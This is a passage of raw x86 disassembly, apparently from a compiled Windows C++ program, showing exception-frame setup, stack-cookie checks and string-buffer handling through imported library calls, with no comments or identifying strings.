  4044b0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4044b6:	b9 c4 f5 40 00       	mov    $0x40f5c4,%ecx
  4044bb:	8d 5c 24 14          	lea    0x14(%esp),%ebx
  4044bf:	e8 5c f3 ff ff       	call   0x403820
  4044c4:	33 db                	xor    %ebx,%ebx
  4044c6:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  4044ca:	f6 05 94 22 41 00 01 	testb  $0x1,0x412294
  4044d1:	8b 35 e0 a2 40 00    	mov    0x40a2e0,%esi
  4044d7:	75 29                	jne    0x404502
  4044d9:	83 0d 94 22 41 00 01 	orl    $0x1,0x412294
  4044e0:	8d 44 24 14          	lea    0x14(%esp),%eax
  4044e4:	50                   	push   %eax
  4044e5:	68 8c 22 41 00       	push   $0x41228c
  4044ea:	c6 44 24 48 01       	movb   $0x1,0x48(%esp)
  4044ef:	ff d6                	call   *%esi
  4044f1:	68 f0 96 40 00       	push   $0x4096f0
  4044f6:	e8 94 3d 00 00       	call   0x40828f
  4044fb:	83 c4 0c             	add    $0xc,%esp
  4044fe:	88 5c 24 40          	mov    %bl,0x40(%esp)
  404502:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404505:	80 39 01             	cmpb   $0x1,(%ecx)
  404508:	75 2e                	jne    0x404538
  40450a:	8d 54 24 14          	lea    0x14(%esp),%edx
  40450e:	52                   	push   %edx
  40450f:	8d 44 24 10          	lea    0x10(%esp),%eax
  404513:	50                   	push   %eax
  404514:	ff d6                	call   *%esi
  404516:	83 c4 08             	add    $0x8,%esp
  404519:	50                   	push   %eax
  40451a:	b9 8c 22 41 00       	mov    $0x41228c,%ecx
  40451f:	c6 44 24 44 02       	movb   $0x2,0x44(%esp)
  404524:	ff 15 fc a2 40 00    	call   *0x40a2fc
  40452a:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40452e:	88 5c 24 40          	mov    %bl,0x40(%esp)
  404532:	ff 15 d8 a2 40 00    	call   *0x40a2d8
  404538:	83 7c 24 28 08       	cmpl   $0x8,0x28(%esp)
  40453d:	72 0e                	jb     0x40454d
  40453f:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404543:	51                   	push   %ecx
  404544:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40454a:	83 c4 04             	add    $0x4,%esp
  40454d:	b8 8c 22 41 00       	mov    $0x41228c,%eax
  404552:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  404556:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40455d:	59                   	pop    %ecx
  40455e:	5e                   	pop    %esi
  40455f:	5b                   	pop    %ebx
  404560:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  404564:	33 cc                	xor    %esp,%ecx
  404566:	e8 15 3c 00 00       	call   0x408180
  40456b:	8b e5                	mov    %ebp,%esp
  40456d:	5d                   	pop    %ebp
  40456e:	c3                   	ret
  40456f:	cc                   	int3
  404570:	55                   	push   %ebp
  404571:	8b ec                	mov    %esp,%ebp
  404573:	51                   	push   %ecx
  404574:	33 c0                	xor    %eax,%eax
  404576:	89 46 10             	mov    %eax,0x10(%esi)
  404579:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40457c:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  404583:	88 06                	mov    %al,(%esi)
  404585:	8b 45 08             	mov    0x8(%ebp),%eax
  404588:	53                   	push   %ebx
  404589:	50                   	push   %eax
  40458a:	83 c8 ff             	or     $0xffffffff,%eax
  40458d:	33 db                	xor    %ebx,%ebx
  40458f:	8b ce                	mov    %esi,%ecx
  404591:	e8 fa 1c 00 00       	call   0x406290
  404596:	8b c6                	mov    %esi,%eax
  404598:	5b                   	pop    %ebx
  404599:	8b e5                	mov    %ebp,%esp
  40459b:	5d                   	pop    %ebp
  40459c:	c2 04 00             	ret    $0x4
  40459f:	cc                   	int3
  4045a0:	55                   	push   %ebp
  4045a1:	8b ec                	mov    %esp,%ebp
  4045a3:	6a ff                	push   $0xffffffff
  4045a5:	68 b0 90 40 00       	push   $0x4090b0
  4045aa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4045b0:	50                   	push   %eax
  4045b1:	83 ec 44             	sub    $0x44,%esp
  4045b4:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4045b9:	33 c5                	xor    %ebp,%eax
  4045bb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4045be:	53                   	push   %ebx
  4045bf:	56                   	push   %esi
  4045c0:	57                   	push   %edi
  4045c1:	50                   	push   %eax
  4045c2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4045c5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4045cb:	8b 45 08             	mov    0x8(%ebp),%eax
  4045ce:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4045d1:	8b 45 14             	mov    0x14(%ebp),%eax
  4045d4:	33 db                	xor    %ebx,%ebx
  4045d6:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  4045d9:	3b c3                	cmp    %ebx,%eax
  4045db:	0f 84 91 00 00 00    	je     0x404672
  4045e1:	8b c8                	mov    %eax,%ecx
  4045e3:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  4045ea:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4045ed:	88 5d d4             	mov    %bl,-0x2c(%ebp)
  4045f0:	8d 71 01             	lea    0x1(%ecx),%esi
  4045f3:	8a 11                	mov    (%ecx),%dl
  4045f5:	41                   	inc    %ecx
  4045f6:	3a d3                	cmp    %bl,%dl
  4045f8:	75 f9                	jne    0x4045f3
  4045fa:	2b ce                	sub    %esi,%ecx
  4045fc:	8b f9                	mov    %ecx,%edi
  4045fe:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  404601:	e8 7a 2a 00 00       	call   0x407080
  404606:	8b d6                	mov    %esi,%edx
  404608:	52                   	push   %edx
  404609:	8d 75 b8             	lea    -0x48(%ebp),%esi
  40460c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40460f:	e8 5c ff ff ff       	call   0x404570
  404614:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  404618:	8b 3d e8 a1 40 00    	mov    0x40a1e8,%edi
  40461e:	be 10 00 00 00       	mov    $0x10,%esi
  404623:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  404626:	72 09                	jb     0x404631
  404628:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40462b:	50                   	push   %eax
  40462c:	ff d7                	call   *%edi
  40462e:	83 c4 04             	add    $0x4,%esp
  404631:	8b 45 b8             	mov    -0x48(%ebp),%eax
  404634:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  40463b:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  40463e:	88 5d d4             	mov    %bl,-0x2c(%ebp)
  404641:	39 75 cc             	cmp    %esi,-0x34(%ebp)
  404644:	73 03                	jae    0x404649
  404646:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404649:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40464c:	8b 11                	mov    (%ecx),%edx
  40464e:	50                   	push   %eax
  40464f:	8b 45 0c             	mov    0xc(%ebp),%eax
  404652:	8b 08                	mov    (%eax),%ecx
  404654:	52                   	push   %edx
  404655:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  404658:	51                   	push   %ecx
  404659:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  40465c:	e8 2f 00 00 00       	call   0x404690
  404661:	83 c4 0c             	add    $0xc,%esp
  404664:	39 75 cc             	cmp    %esi,-0x34(%ebp)
  404667:	72 09                	jb     0x404672
  404669:	8b 55 b8             	mov    -0x48(%ebp),%edx
  40466c:	52                   	push   %edx
  40466d:	ff d7                	call   *%edi
  40466f:	83 c4 04             	add    $0x4,%esp
  404672:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404675:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40467c:	59                   	pop    %ecx
  40467d:	5f                   	pop    %edi
  40467e:	5e                   	pop    %esi
  40467f:	5b                   	pop    %ebx
  404680:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404683:	33 cd                	xor    %ebp,%ecx
  404685:	e8 f6 3a 00 00       	call   0x408180
  40468a:	8b e5                	mov    %ebp,%esp
  40468c:	5d                   	pop    %ebp
  40468d:	c2 10 00             	ret    $0x10
  404690:	55                   	push   %ebp
  404691:	8b ec                	mov    %esp,%ebp
  404693:	83 e4 f8             	and    $0xfffffff8,%esp
  404696:	6a ff                	push   $0xffffffff
  404698:	68 69 90 40 00       	push   $0x409069
  40469d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4046a3:	50                   	push   %eax
  4046a4:	81 ec 00 01 00 00    	sub    $0x100,%esp
  4046aa:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4046af:	33 c4                	xor    %esp,%eax
  4046b1:	89 84 24 f8 00 00 00 	mov    %eax,0xf8(%esp)
  4046b8:	53                   	push   %ebx
  4046b9:	56                   	push   %esi
  4046ba:	57                   	push   %edi
  4046bb:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4046c0:	33 c4                	xor    %esp,%eax
  4046c2:	50                   	push   %eax
  4046c3:	8d 84 24 10 01 00 00 	lea    0x110(%esp),%eax
  4046ca:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4046d0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4046d3:	33 db                	xor    %ebx,%ebx
  4046d5:	50                   	push   %eax
  4046d6:	8b f2                	mov    %edx,%esi
  4046d8:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4046dc:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4046e0:	ff 15 d4 a2 40 00    	call   *0x40a2d4
  4046e6:	84 c0                	test   %al,%al
  4046e8:	0f 84 63 02 00 00    	je     0x404951
  4046ee:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  4046f2:	c7 44 24 1c 38 a9 40 	movl   $0x40a938,0x1c(%esp)
  4046f9:	00 
  4046fa:	ff 15 4c a1 40 00    	call   *0x40a14c
  404700:	53                   	push   %ebx
  404701:	53                   	push   %ebx
  404702:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  404706:	51                   	push   %ecx
  404707:	89 9c 24 24 01 00 00 	mov    %ebx,0x124(%esp)
  40470e:	bf 01 00 00 00       	mov    $0x1,%edi
  404713:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  404717:	89 7c 24 24          	mov    %edi,0x24(%esp)
  40471b:	ff 15 48 a1 40 00    	call   *0x40a148
  404721:	89 bc 24 18 01 00 00 	mov    %edi,0x118(%esp)
  404728:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40472c:	8b 42 04             	mov    0x4(%edx),%eax
  40472f:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  404733:	c7 44 04 1c 34 a9 40 	movl   $0x40a934,0x1c(%esp,%eax,1)
  40473a:	00 
  40473b:	ff 15 44 a1 40 00    	call   *0x40a144
  404741:	c7 44 24 20 f4 a8 40 	movl   $0x40a8f4,0x20(%esp)
  404748:	00 
  404749:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  40474d:	c7 44 24 60 04 00 00 	movl   $0x4,0x60(%esp)
  404754:	00 
  404755:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404758:	51                   	push   %ecx
  404759:	8d 54 24 20          	lea    0x20(%esp),%edx
  40475d:	52                   	push   %edx
  40475e:	c7 84 24 20 01 00 00 	movl   $0x3,0x120(%esp)
  404765:	03 00 00 00 
  404769:	e8 d2 34 00 00       	call   0x407c40
  40476e:	8b c6                	mov    %esi,%eax
  404770:	83 c4 08             	add    $0x8,%esp
  404773:	c7 84 24 c8 00 00 00 	movl   $0xf,0xc8(%esp)
  40477a:	0f 00 00 00 
  40477e:	89 9c 24 c4 00 00 00 	mov    %ebx,0xc4(%esp)
  404785:	88 9c 24 b4 00 00 00 	mov    %bl,0xb4(%esp)
  40478c:	8d 78 01             	lea    0x1(%eax),%edi
  40478f:	90                   	nop
  404790:	8a 08                	mov    (%eax),%cl
  404792:	40                   	inc    %eax
  404793:	3a cb                	cmp    %bl,%cl
  404795:	75 f9                	jne    0x404790
  404797:	2b c7                	sub    %edi,%eax
  404799:	8b f8                	mov    %eax,%edi
  40479b:	8b c6                	mov    %esi,%eax
  40479d:	8d b4 24 b4 00 00 00 	lea    0xb4(%esp),%esi
  4047a4:	e8 d7 28 00 00       	call   0x407080
  4047a9:	8b ce                	mov    %esi,%ecx
  4047ab:	8d 94 24 d0 00 00 00 	lea    0xd0(%esp),%edx
  4047b2:	c6 84 24 18 01 00 00 	movb   $0x4,0x118(%esp)
  4047b9:	04 
  4047ba:	e8 d1 ef ff ff       	call   0x403790
  4047bf:	bf 10 00 00 00       	mov    $0x10,%edi
  4047c4:	c6 84 24 18 01 00 00 	movb   $0x6,0x118(%esp)
  4047cb:	06 
  4047cc:	39 bc 24 c8 00 00 00 	cmp    %edi,0xc8(%esp)
  4047d3:	72 11                	jb     0x4047e6
  4047d5:	8b 84 24 b4 00 00 00 	mov    0xb4(%esp),%eax
  4047dc:	50                   	push   %eax
  4047dd:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4047e3:	83 c4 04             	add    $0x4,%esp
  4047e6:	8d b4 24 ec 00 00 00 	lea    0xec(%esp),%esi
  4047ed:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4047f1:	c7 84 24 c8 00 00 00 	movl   $0xf,0xc8(%esp)
  4047f8:	0f 00 00 00 
  4047fc:	89 9c 24 c4 00 00 00 	mov    %ebx,0xc4(%esp)
  404803:	88 9c 24 b4 00 00 00 	mov    %bl,0xb4(%esp)
  40480a:	e8 51 18 00 00       	call   0x406060
  40480f:	c6 84 24 18 01 00 00 	movb   $0x7,0x118(%esp)
  404816:	07 
  404817:	8b 8c 24 d0 00 00 00 	mov    0xd0(%esp),%ecx
  40481e:	39 bc 24 e4 00 00 00 	cmp    %edi,0xe4(%esp)
  404825:	73 07                	jae    0x40482e
  404827:	8d 8c 24 d0 00 00 00 	lea    0xd0(%esp),%ecx
  40482e:	8b 55 08             	mov    0x8(%ebp),%edx
  404831:	52                   	push   %edx
  404832:	51                   	push   %ecx
  404833:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404837:	50                   	push   %eax
  404838:	8b 45 0c             	mov    0xc(%ebp),%eax
  40483b:	50                   	push   %eax
  40483c:	ff 15 dc a2 40 00    	call   *0x40a2dc
  404842:	83 bc 24 00 01 00 00 	cmpl   $0x8,0x100(%esp)
  404849:	08 
  40484a:	8b 35 e8 a1 40 00    	mov    0x40a1e8,%esi
  404850:	72 0d                	jb     0x40485f
  404852:	8b 8c 24 ec 00 00 00 	mov    0xec(%esp),%ecx
  404859:	51                   	push   %ecx
  40485a:	ff d6                	call   *%esi
  40485c:	83 c4 04             	add    $0x4,%esp
  40485f:	33 d2                	xor    %edx,%edx
  404861:	c7 84 24 00 01 00 00 	movl   $0x7,0x100(%esp)
  404868:	07 00 00 00 
  40486c:	89 9c 24 fc 00 00 00 	mov    %ebx,0xfc(%esp)
  404873:	66 89 94 24 ec 00 00 	mov    %dx,0xec(%esp)
  40487a:	00 
  40487b:	39 bc 24 e4 00 00 00 	cmp    %edi,0xe4(%esp)
  404882:	72 0d                	jb     0x404891
  404884:	8b 84 24 d0 00 00 00 	mov    0xd0(%esp),%eax
  40488b:	50                   	push   %eax
  40488c:	ff d6                	call   *%esi
  40488e:	83 c4 04             	add    $0x4,%esp
  404891:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  404895:	c7 84 24 e4 00 00 00 	movl   $0xf,0xe4(%esp)
  40489c:	0f 00 00 00 
  4048a0:	89 9c 24 e0 00 00 00 	mov    %ebx,0xe0(%esp)
  4048a7:	88 9c 24 d0 00 00 00 	mov    %bl,0xd0(%esp)
  4048ae:	8b 42 04             	mov    0x4(%edx),%eax
  4048b1:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  4048b5:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4048b9:	c7 44 04 1c 34 a9 40 	movl   $0x40a934,0x1c(%esp,%eax,1)
  4048c0:	00 
  4048c1:	c7 84 24 18 01 00 00 	movl   $0x8,0x118(%esp)
  4048c8:	08 00 00 00 
  4048cc:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4048d0:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4048d4:	c7 44 24 20 f4 a8 40 	movl   $0x40a8f4,0x20(%esp)
  4048db:	00 
  4048dc:	c6 84 24 18 01 00 00 	movb   $0x9,0x118(%esp)
  4048e3:	09 
  4048e4:	f6 44 24 60 01       	testb  $0x1,0x60(%esp)
  4048e9:	74 0c                	je     0x4048f7
  4048eb:	8b 54 24 30          	mov    0x30(%esp),%edx
  4048ef:	8b 02                	mov    (%edx),%eax
  4048f1:	50                   	push   %eax
  4048f2:	ff d6                	call   *%esi
  4048f4:	83 c4 04             	add    $0x4,%esp
  4048f7:	53                   	push   %ebx
  4048f8:	53                   	push   %ebx
  4048f9:	53                   	push   %ebx
  4048fa:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  4048fe:	ff 15 58 a1 40 00    	call   *0x40a158
  404904:	53                   	push   %ebx
  404905:	53                   	push   %ebx
  404906:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  40490a:	ff 15 54 a1 40 00    	call   *0x40a154
  404910:	83 64 24 60 fe       	andl   $0xfffffffe,0x60(%esp)
  404915:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  404919:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  40491d:	c6 84 24 18 01 00 00 	movb   $0x8,0x118(%esp)
  404924:	08 
  404925:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  40492b:	c7 84 24 18 01 00 00 	movl   $0xffffffff,0x118(%esp)
  404932:	ff ff ff ff 
  404936:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40493a:	8b 48 04             	mov    0x4(%eax),%ecx
  40493d:	8b 15 34 a1 40 00    	mov    0x40a134,%edx
  404943:	89 54 0c 1c          	mov    %edx,0x1c(%esp,%ecx,1)
  404947:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  40494b:	ff 15 6c a1 40 00    	call   *0x40a16c
  404951:	8b 8c 24 10 01 00 00 	mov    0x110(%esp),%ecx
  404958:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40495f:	59                   	pop    %ecx
  404960:	5f                   	pop    %edi
  404961:	5e                   	pop    %esi
  404962:	5b                   	pop    %ebx
  404963:	8b 8c 24 f8 00 00 00 	mov    0xf8(%esp),%ecx
  40496a:	33 cc                	xor    %esp,%ecx
  40496c:	e8 0f 38 00 00       	call   0x408180
  404971:	8b e5                	mov    %ebp,%esp
  404973:	5d                   	pop    %ebp
  404974:	c3                   	ret
  404975:	cc                   	int3
  404976:	cc                   	int3
  404977:	cc                   	int3
  404978:	cc                   	int3
  404979:	cc                   	int3
  40497a:	cc                   	int3
  40497b:	cc                   	int3
  40497c:	cc                   	int3
  40497d:	cc                   	int3
  40497e:	cc                   	int3
  40497f:	cc                   	int3
  404980:	55                   	push   %ebp
  404981:	8b ec                	mov    %esp,%ebp
  404983:	83 e4 f8             	and    $0xfffffff8,%esp
  404986:	83 ec 1c             	sub    $0x1c,%esp
